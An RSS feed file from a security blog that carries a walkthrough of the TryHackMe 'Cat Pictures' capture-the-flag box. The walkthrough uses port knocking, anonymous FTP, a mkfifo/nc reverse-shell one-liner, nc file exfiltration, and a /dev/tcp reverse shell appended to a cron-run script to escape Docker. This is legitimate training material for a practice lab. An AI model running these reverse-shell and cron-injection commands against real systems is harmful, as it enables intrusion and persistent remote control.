@@ -1,0 +1,186 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Port-Knocking on</title><link>https://h4r1337.github.io/tags/port-knocking/</link><description>Recent content in Port-Knocking on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 07 Jul 2022 11:36:39 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/port-knocking/index.xml" rel="self" type="application/rss+xml"/><item><title>Cat Pictures Writeup | TryHackMe</title><link>https://h4r1337.github.io/posts/cat-pictures/</link><pubDate>Thu, 07 Jul 2022 11:36:39 +0530</pubDate><guid>https://h4r1337.github.io/posts/cat-pictures/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;ul>
+&lt;li>&lt;strong>Name:&lt;/strong> &lt;a href="https://tryhackme.com/room/catpictures">Cat Pictures&lt;/a>&lt;/li>
+&lt;li>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/li>
+&lt;li>&lt;strong>Description:&lt;/strong> I made a forum where you can post cute cat pictures!&lt;/li>
+&lt;/ul>
+&lt;p>In this easy box, we have to use a technique called &lt;a href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking&lt;/a> to open an
+anonymous ftp service. And then using the credentials got from the ftp server, we will get access to a very limited shell.
+From there we will use &lt;code>mkfifo&lt;/code> to upgrade the shell. After that
+we have to reverse a simple binary file to get the password to run that binary, which will give us a ssh private key.
+We will use that to SSH into a docker instance running on the box. For reading the final root flag we will modify a script
+to run a revese shell, which is called by a cronjob.&lt;/p></description><content>&lt;h2 id="overview">Overview&lt;/h2>
+&lt;ul>
+&lt;li>&lt;strong>Name:&lt;/strong> &lt;a href="https://tryhackme.com/room/catpictures">Cat Pictures&lt;/a>&lt;/li>
+&lt;li>&lt;strong>Difficulty:&lt;/strong> Easy&lt;/li>
+&lt;li>&lt;strong>Description:&lt;/strong> I made a forum where you can post cute cat pictures!&lt;/li>
+&lt;/ul>
+&lt;p>In this easy box, we have to use a technique called &lt;a href="https://en.wikipedia.org/wiki/Port_knocking">Port Knocking&lt;/a> to open an
+anonymous ftp service. And then using the credentials got from the ftp server, we will get access to a very limited shell.
+From there we will use &lt;code>mkfifo&lt;/code> to upgrade the shell. After that
+we have to reverse a simple binary file to get the password to run that binary, which will give us a ssh private key.
+We will use that to SSH into a docker instance running on the box. For reading the final root flag we will modify a script
+to run a revese shell, which is called by a cronjob.&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>We can start with an nmap scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sC -sV -vv 10.10.85.194 -oA nmap/initial-scan
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br/>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>Nmap scan report for 10.10.248.153
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up (0.048s latency).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2022-07-07 12:06:05 IST for 3060s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: 65424 closed ports, 108 filtered ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ 256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4420/tcp open nvm-express?
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| fingerprint-strings:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| INTERNAL SHELL SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ctrl-c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Please enter password:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Invalid password...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Connection Closed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NULL, RPCCheck:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| INTERNAL SHELL SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ctrl-c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Please enter password:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8080/tcp open http Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD POST OPTIONS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-open-proxy: Potentially OPEN proxy.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_Methods supported:CONNECTION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Cat Pictures - Index page
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As we can see 3 ports are open:&lt;/p>
+&lt;ul>
+&lt;li>22/tcp -&amp;gt; ssh&lt;/li>
+&lt;li>4420/tcp -&amp;gt; ???&lt;/li>
+&lt;li>8080/tcp -&amp;gt; http&lt;/li>
+&lt;/ul>
+&lt;h3 id="port-4420----internal-shell-service">Port 4420 &amp;ndash; INTERNAL SHELL SERVICE&lt;/h3>
+&lt;p>From the above nmap scan we found there is an unusual port (&lt;code>4420/tcp&lt;/code>) is open. So let&amp;rsquo;s check that one first.
+We can use &lt;code>nc&lt;/code> to find out what service is running on that port.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/port-4420.webp" alt="Port 4420" style="ZgotmplZ">
+&lt;p>We need a password for accessing the &lt;kbd>INTERNAL SHELL SERVICE&lt;/kbd>. Leave this for later&amp;hellip;&lt;/p>
+&lt;h3 id="phpbb">phpBB&lt;/h3>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/phpbb.webp" alt="phpBB" style="ZgotmplZ">
+&lt;p>Port 8080 is hosting a &lt;a href="https://www.phpbb.com">phpBB forum&lt;/a>. After playing around with it a bit, I found that there is only
+one user named &lt;code>user&lt;/code>.
+Who is likely to be the admin. Account registration doesn&amp;rsquo;t work properly.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/auth-error.webp" alt="port fairy" style="ZgotmplZ">
+&lt;p>And no other known phpBB attacks work, but account
+login seems working fine -&amp;gt; password bruteforce?&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/knock-knock-hint.webp" alt="port knocking hint" style="ZgotmplZ">
+&lt;p>There was only one post, which gives us a hint about port knocking. But at the time of solving I didn&amp;rsquo;t know about port
+knocking and, it took me some time to realise (I mean, got help :P ).&lt;/p>
+&lt;h2 id="port-knocking">Port Knocking&lt;/h2>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/port-knocking-help.webp" alt="port fairy" style="ZgotmplZ">
+&lt;p>&lt;a href="https://en.wikipedia.org/wiki/Port_knocking">Port knocking&lt;/a> was some new technique to me. It took me some time to get that,
+Well thanks @pood and @FluffMe from TryHackMe discord for this hint :)
+Before moving forward you must have to do some google-fu to understand what is port knocking. Here is a reference if you
+want to know more about port knocking:
+&lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html">port knocking&lt;/a>&lt;/p>
+&lt;p>Basically port knocking is a way to hide a specific port from an attacker. We can define some rules to open a port
+only if we knock some other ports in a specific order. Here knock means to send some TCP packets with SYN flag. If we knock
+the ports in the same order defined by the server, the hidden port will open.&lt;/p>
+&lt;p>So we have to knock on each port given in that forum and, it will open another port that was filtered or closed before.
+We can do this with &lt;code>bash&lt;/code> and &lt;code>nc&lt;/code> or we can install a tool called &lt;code>knockd&lt;/code> which is available on ubuntu by default. If
+not, you can download it by running:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo apt-get install knockd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The magic numbers listed in the phpBB forum are ports to knock to open a filtered port. We can knock ports by using
+different methods:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># With knockd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo apt-get install knockd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>knock 10.10.85.194 &lt;span style="color:#d3869b">1111&lt;/span> &lt;span style="color:#d3869b">2222&lt;/span> &lt;span style="color:#d3869b">3333&lt;/span> &lt;span style="color:#d3869b">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># With nc&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> P in &lt;span style="color:#d3869b">1111&lt;/span> &lt;span style="color:#d3869b">2222&lt;/span> &lt;span style="color:#d3869b">3333&lt;/span> 4444; &lt;span style="color:#fe8019">do&lt;/span> nc -vz 10.10.85.194 $P ;&lt;span style="color:#fe8019">done&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After port knocking we have to port scan the target once more to view the revealed port.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -T4 10.10.85.194
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br/>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Starting Nmap 7.80 &lt;span style="color:#fe8019">(&lt;/span> https://nmap.org &lt;span style="color:#fe8019">)&lt;/span> at 2022-07-07 15:22 IST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.85.194
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.51s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">997&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>21/tcp open ftp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8080/tcp open http-proxy
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#fe8019">done&lt;/span>: &lt;span style="color:#d3869b">1&lt;/span> IP address &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#d3869b">1&lt;/span> host up&lt;span style="color:#fe8019">)&lt;/span> scanned in 44.51 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see that the port 21, &lt;code>ftp&lt;/code> is open now.&lt;/p>
+&lt;h2 id="ftp-discovery">FTP Discovery&lt;/h2>
+&lt;p>If we found an open &lt;strong>FTP&lt;/strong> service, first things to do is to check for anonymous login. We can check this by:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ftp anonymous@10.10.85.194
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br/>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/ftp.webp" alt="FTP anonymous login" style="ZgotmplZ">
+&lt;p>Success!!! Anonymous login is enabled. There is only one file available &lt;code>note.txt&lt;/code> which probably contains the password for
+the &lt;code>INTERNAL SHELL SERVICE&lt;/code>. Trust me CTFs are kinda predictable 😂.&lt;/p>
+&lt;p>As I said:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>In case I forget my password, I&amp;#39;m leaving a pointer to the internal
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>shell service on the server.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connect to port 4420, the password is *********.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>- catlover
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="initial-access----internal-shell-service">Initial Access &amp;ndash; INTERNAL SHELL SERVICE&lt;/h2>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/got-access-to-internal-shell.webp" alt="Port 4420" style="ZgotmplZ">
+&lt;p>As we now have the password, we can get inside the &lt;code>INTERNAL SHELL SERVICE&lt;/code> running on port 4420.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/port-4420-commands-available.webp" alt="Commands available" style="ZgotmplZ">
+&lt;p>As you can see here we only have these binaries available in this limited shell. But most interestingly we have an
+&lt;code>mkfifo&lt;/code> binary available, which we can use to upgrade our shell.&lt;/p>
+&lt;p>&lt;em>&lt;strong>NOTE: You can&amp;rsquo;t go ahead without upgrading the shell.&lt;/strong>&lt;/em>&lt;/p>
+&lt;p>Lets checkout &lt;a href="https://www.revshells.com">revshells.com&lt;/a> for &lt;code>mkfifo&lt;/code> and &lt;code>nc&lt;/code> reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># your machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc -lvnp port
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># target machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc your_vpn_ip port &amp;gt;/tmp/f
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br/>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/mkfifo-rev-shell.webp" alt="rev shell recieved" style="ZgotmplZ">
+&lt;p>After checking out the home directory, I found out a wierd &lt;code>runme&lt;/code> located under the user &lt;strong>catlover&lt;/strong>. Tried running it
+but, it also requires a password to run.&lt;/p>
+&lt;p>&lt;em>&lt;strong>NOTE: As I said earlier, to run the &lt;code>runme&lt;/code> binary we need to upgrade the shell.&lt;/strong>&lt;/em>&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/regular-shell-warning.webp" alt="runme not running" style="ZgotmplZ">
+&lt;p>We need to retrieve that binary to our machine to do some further investigations 🔍.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># File transfer using nc&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># On our machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc -lp port &amp;gt; runme
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># On target machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc -w &lt;span style="color:#d3869b">3&lt;/span> your-vpn-ip port &amp;lt; /home/catlover/runme
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can use the &lt;code>strings&lt;/code> command for retrieving printable characters in the binary file, and hope the password is
+there.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/strings-runme.webp" alt="strings runme" style="ZgotmplZ">
+&lt;p>This one looks like a password. After trying, I can confirm that is the valid password. Now we can use the password to run
+the binary. This &lt;code>runme&lt;/code> binary gives us an SSH private key in the directory where the binary exists,
+which we can then use to SSH into the catlover user.&lt;/p>
+&lt;p>We have to retrieve the &lt;code>id_rsa&lt;/code> file we got, set the permission, and SSH into the user.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#d3869b">600&lt;/span> id_rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh catlover@catpictures.thm -i id_rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;br/>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/ssh-success.webp" alt="SSH success" style="ZgotmplZ">
+&lt;h2 id="privilage-escalation----escape-docker">Privilage Escalation &amp;ndash; Escape Docker&lt;/h2>
+&lt;p>Now that we have logged in, let&amp;rsquo;s read the first flag&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/user-flag.webp" alt="user flag" style="ZgotmplZ">
+&lt;p>It shows that we are root but actually, we are not root. We are inside a docker container and we have to exit that to get
+the final flag.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/docker-confirm.webp" alt="Docke confirmed" style="ZgotmplZ">
+&lt;p>So how to escape the docker container and read the final flag? You will get a hint if you tried running &lt;code>history&lt;/code>.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/history.webp" alt="history output" style="ZgotmplZ">
+&lt;p>There is a cron job that is running on the machine which executes the &lt;code>clean.sh&lt;/code> file. We have to inject a reverse shell
+inside that file to get the actual root.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># your machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc -lnvp &lt;span style="color:#d3869b">9999&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Target machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/your-vpn-ip/9999 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span> &amp;gt;&amp;gt; /opt/clean/clean.sh
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can read the final root flag and end the machine.&lt;/p>
+&lt;img src="https://h4r1337.github.io/img/cat-pictures/root-flag.webp" alt="root flag" style="ZgotmplZ">
+&lt;hr>
+&lt;p>This box is a good example of why is it hard to make an easy ctf challenge :). From
+this box I learned about port knocking, which I can probably use for other CTFs.&lt;/p></content></item></channel></rss>
